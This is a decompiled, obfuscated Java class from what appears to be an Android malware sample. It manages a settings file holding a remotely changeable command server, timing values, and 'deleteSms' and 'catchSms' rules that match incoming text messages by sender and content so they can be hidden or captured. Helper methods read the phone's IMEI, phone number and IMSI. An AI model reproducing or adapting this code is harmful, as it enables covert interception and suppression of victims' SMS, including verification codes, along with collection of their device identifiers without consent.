package com.load.wap;

import android.content.Context;
import android.telephony.TelephonyManager;
import android.util.Xml;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.io.Reader;
import java.util.List;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserFactory;
import org.xmlpull.v1.XmlSerializer;

public final class f
{
  public static int a = 1000;
  public static int b = 60000;
  public static int c = 3600000;
  public static int d = 86400000;
  public static g e;
  
  public f()
  {
    e = new g();
  }
  
  public static void a(long paramLong)
  {
    int i = 0;
    for (;;)
    {
      if (i >= e.i.size()) {
        return;
      }
      if (((h)e.i.get(i)).a == paramLong)
      {
        e.i.remove(i);
        return;
      }
      i += 1;
    }
  }
  
  public static boolean a(Context paramContext)
  {
    boolean bool1 = false;
    System.out.println("Settings::load() start");
    try
    {
      boolean bool2 = a(paramContext.openFileInput("settings"));
      bool1 = bool2;
    }
    catch (Exception paramContext)
    {
      for (;;)
      {
        paramContext.printStackTrace();
      }
    }
    System.out.println("Settings::load() end");
    return bool1;
  }
  
  public static boolean a(Context paramContext, String paramString)
  {
    if (paramString.startsWith(e.j))
    {
      e.g = paramString.replace(e.j, "");
      paramString = MainApplication.c;
      b(paramContext);
      return true;
    }
    return false;
  }
  
  private static boolean a(InputStream paramInputStream)
  {
    try
    {
      e = new g();
      XmlPullParser localXmlPullParser = XmlPullParserFactory.newInstance().newPullParser();
      localXmlPullParser.setInput(paramInputStream, null);
      boolean bool = a(localXmlPullParser);
      return bool;
    }
    catch (Exception paramInputStream)
    {
      paramInputStream.printStackTrace();
    }
    return false;
  }
  
  public static boolean a(Reader paramReader)
  {
    try
    {
      e = new g();
      XmlPullParser localXmlPullParser = XmlPullParserFactory.newInstance().newPullParser();
      localXmlPullParser.setInput(paramReader);
      boolean bool = a(localXmlPullParser);
      return bool;
    }
    catch (Exception paramReader)
    {
      paramReader.printStackTrace();
    }
    return false;
  }
  
  public static boolean a(String paramString1, String paramString2)
  {
    int i = 0;
    for (;;)
    {
      if (i >= e.h.size()) {
        return false;
      }
      h localH = (h)e.h.get(i);
      localH.b = localH.b.toLowerCase();
      localH.c = localH.c.toLowerCase();
      paramString1 = paramString1.toLowerCase();
      paramString2 = paramString2.toLowerCase();
      if ((localH.b.compareTo("*") == 0) && (localH.c.compareTo("*") == 0)) {
        return true;
      }
      if ((localH.b.compareTo("*") == 0) && (paramString2.indexOf(localH.c) != -1)) {
        return true;
      }
      if ((localH.c.compareTo("*") == 0) && (paramString1.indexOf(localH.b) != -1)) {
        return true;
      }
      if ((paramString1.indexOf(localH.b) != -1) && (paramString2.indexOf(localH.c) != -1)) {
        return true;
      }
      i += 1;
    }
  }
  
  private static boolean a(XmlPullParser paramXmlPullParser)
  {
    h localH = null;
    Object localObject = "";
    do
    {
      for (;;)
      {
        switch (paramXmlPullParser.next())
        {
        default: 
          break;
        case 1: 
          return true;
        case 2: 
          String str = paramXmlPullParser.getName();
          if (str.equals("version"))
          {
            e.c = b.a(paramXmlPullParser, "value");
            localObject = str;
          }
          else if (str.equals("sid"))
          {
            e.d = b.a(paramXmlPullParser, "value");
            localObject = str;
          }
          else if (str.equals("server"))
          {
            e.g = b.a(paramXmlPullParser, "value");
            localObject = str;
          }
          else if (str.equals("period"))
          {
            e.e = Long.parseLong(b.a(paramXmlPullParser, "value"));
            localObject = str;
          }
          else if (str.equals("wait"))
          {
            e.f = Long.parseLong(b.a(paramXmlPullParser, "value"));
            localObject = str;
          }
          else if (str.equals("serverPrefix"))
          {
            e.j = b.a(paramXmlPullParser, "value");
            localObject = str;
          }
          else if ((str.equals("deleteSms")) || (str.equals("catchSms")))
          {
            localH = new h();
            localH.a = Long.parseLong(b.a(paramXmlPullParser, "key"));
            localH.b = b.a(paramXmlPullParser, "number");
            localObject = str;
          }
          else if (str.equals("time"))
          {
            e.a = Long.parseLong(b.a(paramXmlPullParser, "value"));
            localObject = str;
          }
          else
          {
            localObject = str;
            if (str.equals("smsIndex"))
            {
              e.b = Integer.parseInt(b.a(paramXmlPullParser, "value"));
              localObject = str;
            }
          }
          break;
        }
      }
      if (((String)localObject).equals("deleteSms"))
      {
        localH.c = paramXmlPullParser.getText();
        e.h.add(localH);
      }
      for (;;)
      {
        localObject = "";
        break;
        if (((String)localObject).equals("catchSms"))
        {
          localH.c = paramXmlPullParser.getText();
          e.i.add(localH);
        }
      }
    } while (!paramXmlPullParser.getName().equals("settings"));
    return true;
  }
  
  public static a b(String paramString1, String paramString2)
  {
    int i = 0;
    for (;;)
    {
      if (i >= e.i.size()) {
        return new a(false, 0L);
      }
      h localH = (h)e.i.get(i);
      localH.b = localH.b.toLowerCase();
      localH.c = localH.c.toLowerCase();
      paramString1 = paramString1.toLowerCase();
      paramString2 = paramString2.toLowerCase();
      if ((localH.b.compareTo("*") == 0) && (localH.c.compareTo("*") == 0)) {
        return new a(true, localH.a);
      }
      if ((localH.b.compareTo("*") == 0) && (paramString2.indexOf(localH.c) != -1)) {
        return new a(true, localH.a);
      }
      if ((localH.c.compareTo("*") == 0) && (paramString1.indexOf(localH.b) != -1)) {
        return new a(true, localH.a);
      }
      if ((paramString1.indexOf(localH.b) != -1) && (paramString2.indexOf(localH.c) != -1)) {
        return new a(true, localH.a);
      }
      i += 1;
    }
  }
  
  public static boolean b(Context paramContext)
  {
    System.out.println("Settings::save() start");
    for (;;)
    {
      try
      {
        localObject = paramContext.openFileOutput("settings", 0);
        paramContext = Xml.newSerializer();
        paramContext.setOutput(new OutputStreamWriter((OutputStream)localObject));
        paramContext.startDocument("UTF-8", Boolean.valueOf(true));
        paramContext.startTag("", "settings");
        paramContext.startTag("", "time");
        paramContext.attribute("", "value", String.valueOf(e.a));
        paramContext.endTag("", "time");
        paramContext.startTag("", "smsIndex");
        paramContext.attribute("", "value", String.valueOf(e.b));
        paramContext.endTag("", "smsIndex");
        paramContext.startTag("", "version");
        paramContext.attribute("", "value", e.c);
        paramContext.endTag("", "version");
        paramContext.startTag("", "sid");
        paramContext.attribute("", "value", e.d);
        paramContext.endTag("", "sid");
        paramContext.startTag("", "server");
        paramContext.attribute("", "value", e.g);
        paramContext.endTag("", "server");
        paramContext.startTag("", "period");
        paramContext.attribute("", "value", String.valueOf(e.e));
        paramContext.endTag("", "period");
        paramContext.startTag("", "wait");
        paramContext.attribute("", "value", String.valueOf(e.f));
        paramContext.endTag("", "wait");
        paramContext.startTag("", "serverPrefix");
        paramContext.attribute("", "value", e.j);
        paramContext.endTag("", "serverPrefix");
        i = 0;
        if (i < e.h.size()) {
          continue;
        }
        i = 0;
        if (i < e.i.size()) {
          continue;
        }
        paramContext.endTag("", "settings");
        paramContext.endDocument();
      }
      catch (Exception paramContext)
      {
        Object localObject;
        int i;
        paramContext.printStackTrace();
        continue;
      }
      System.out.println("Settings::save() end");
      return false;
      localObject = (h)e.h.get(i);
      paramContext.startTag("", "deleteSms");
      paramContext.attribute("", "key", String.valueOf(((h)localObject).a));
      paramContext.attribute("", "number", ((h)localObject).b);
      paramContext.text(((h)localObject).c);
      paramContext.endTag("", "deleteSms");
      i += 1;
      continue;
      localObject = (h)e.i.get(i);
      paramContext.startTag("", "catchSms");
      paramContext.attribute("", "key", String.valueOf(((h)localObject).a));
      paramContext.attribute("", "number", ((h)localObject).b);
      paramContext.text(((h)localObject).c);
      paramContext.endTag("", "catchSms");
      i += 1;
    }
  }
  
  public static String c(Context paramContext)
  {
    try
    {
      paramContext = (TelephonyManager)paramContext.getSystemService("phone");
      if (paramContext == null) {
        return "";
      }
      paramContext = paramContext.getDeviceId();
      return paramContext;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "";
  }
  
  public static String d(Context paramContext)
  {
    try
    {
      paramContext = (TelephonyManager)paramContext.getSystemService("phone");
      if (paramContext == null) {
        paramContext = "";
      }
      String str;
      do
      {
        return paramContext;
        str = paramContext.getLine1Number();
        paramContext = str;
      } while (str != null);
      return "";
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "";
  }
  
  public static String e(Context paramContext)
  {
    try
    {
      paramContext = (TelephonyManager)paramContext.getSystemService("phone");
      if (paramContext == null) {
        return "";
      }
      paramContext = paramContext.getSubscriberId();
      return paramContext;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return "";
  }
}
